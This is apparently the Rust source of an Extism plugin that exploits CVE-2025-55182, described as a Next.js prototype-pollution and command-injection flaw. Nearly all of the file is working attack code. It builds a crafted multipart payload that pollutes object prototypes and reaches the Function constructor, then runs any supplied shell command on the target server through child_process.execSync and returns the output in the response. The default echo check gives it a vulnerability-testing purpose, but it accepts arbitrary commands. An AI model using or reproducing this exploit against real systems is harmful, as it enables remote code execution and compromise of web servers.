use extism_pdk::*;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};

#[derive(Serialize, Deserialize)]
struct PluginArgs {
    #[serde(default = "default_base_url")]
    base_url: String,
    #[serde(default)]
    executable: Option<String>,
}

fn default_base_url() -> String {
    "http://localhost:3000".to_string()
}

#[derive(Serialize)]
struct JsonSchema {
    #[serde(rename = "type")]
    schema_type: String,
    properties: SchemaProperties,
}

#[derive(Serialize)]
struct SchemaProperties {
    base_url: PropertySchema,
    executable: PropertySchema,
}

#[derive(Serialize)]
struct PropertySchema {
    #[serde(rename = "type")]
    prop_type: String,
    description: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    default: Option<String>,
}

#[plugin_fn]
pub fn name() -> FnResult<String> {
    Ok("cve-2025-55182-exploit".to_string())
}

#[plugin_fn]
pub fn description() -> FnResult<String> {
    Ok("Exploit plugin for CVE-2025-55182 - Next.js prototype pollution and command injection vulnerability".to_string())
}

#[plugin_fn]
pub fn json_schema() -> FnResult<String> {
    let schema = JsonSchema {
        schema_type: "object".to_string(),
        properties: SchemaProperties {
            base_url: PropertySchema {
                prop_type: "string".to_string(),
                description: "Base URL of the target Next.js application".to_string(),
                default: Some("http://localhost:3000".to_string()),
            },
            executable: PropertySchema {
                prop_type: "string".to_string(),
                description: "Arbitrary command to execute on the target system via command injection (defaults to 'echo HARNESS_<random_number>' for vulnerability testing)".to_string(),
                default: None,
            },
        },
    };
    
    Ok(serde_json::to_string(&schema)?)
}

#[plugin_fn]
pub fn execute() -> FnResult<Json<Value>> {
    // Read input JSON args and deserialize using serde
    let input: Json<PluginArgs> = input()?;
    let args = input.0;
    
    // Use the deserialized values
    let base_url = args.base_url;
    
    // Generate a random number for vulnerability testing
    let mut hasher = DefaultHasher::new();
    base_url.hash(&mut hasher);
    "cve-2025-55182-harness-test".hash(&mut hasher);
    let random_number = (hasher.finish() % 9000000000) + 1000000000; // 10-digit number
    let harness_string = format!("HARNESS_{}", random_number);
    
    // Use provided executable or default to echo with HARNESS_<random_number>
    let (executable, using_default) = if let Some(custom_exec) = args.executable {
        (custom_exec, false)
    } else {
        (format!("echo {}", harness_string), true)
    };
    
    // Craft the malicious chunk for prototype pollution
    let crafted_chunk = json!({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": json!({"then": "$B0"}).to_string(),
        "_response": {
            "_prefix": format!("var res = process.mainModule.require('child_process').execSync('{}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});", executable),
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    });
    
    // Create multipart form data
    // Format: --boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{json}\r\n--boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n--boundary--
    let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    let file0_content = crafted_chunk.to_string();
    let file1_content = "\"$@0\"";
    
    let mut multipart_body = Vec::new();
    
    // File 0
    multipart_body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    multipart_body.extend_from_slice(b"Content-Disposition: form-data; name=\"0\"\r\n\r\n");
    multipart_body.extend_from_slice(file0_content.as_bytes());
    multipart_body.extend_from_slice(b"\r\n");
    
    // File 1
    multipart_body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    multipart_body.extend_from_slice(b"Content-Disposition: form-data; name=\"1\"\r\n\r\n");
    multipart_body.extend_from_slice(file1_content.as_bytes());
    multipart_body.extend_from_slice(b"\r\n");
    
    // Closing boundary
    multipart_body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());
    
    // Make HTTP POST request
    let content_type = format!("multipart/form-data; boundary={}", boundary);
    let req = HttpRequest::new(base_url.as_str())
        .with_method("POST")
        .with_header("Next-Action", "x")
        .with_header("Content-Type", &content_type);
    
    let res = http::request::<Vec<u8>>(&req, Some(multipart_body))?;
    
    // Get response status and body
    let status_code = res.status_code();
    let body = String::from_utf8_lossy(&res.body()).to_string();
    
    // Check vulnerability: if using default echo command, check for HARNESS_<random_number> in response
    let (is_vulnerable, vulnerability_status) = if using_default {
        let vulnerable = body.contains(&harness_string);
        let status = if vulnerable {
            "VULNERABLE - Command injection confirmed"
        } else {
            "NOT VULNERABLE - HARNESS string not found in response"
        };
        (Some(vulnerable), status)
    } else {
        (None, "Custom command executed - manual verification required")
    };
    
    // Create response
    let mut result = json!({
        "status_code": status_code,
        "response_body": body,
        "base_url": base_url,
        "executable": executable,
    });
    
    if using_default {
        result["harness_string"] = json!(harness_string);
        result["vulnerable"] = json!(is_vulnerable.unwrap());
    }
    result["vulnerability_status"] = json!(vulnerability_status);
    
    Ok(Json(result))
}
